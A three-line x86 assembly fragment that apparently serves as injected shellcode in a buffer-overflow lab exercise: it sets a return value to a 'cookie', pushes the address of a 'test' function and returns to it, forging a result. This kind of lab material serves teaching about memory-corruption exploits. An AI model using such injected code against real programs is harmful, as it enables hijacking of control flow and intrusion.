movl $0x2eca4965, %eax  /* set return value as cookie */
pushl $0x08048c57      	/* push the address of test to the stack */
ret        	            /* go back to test */
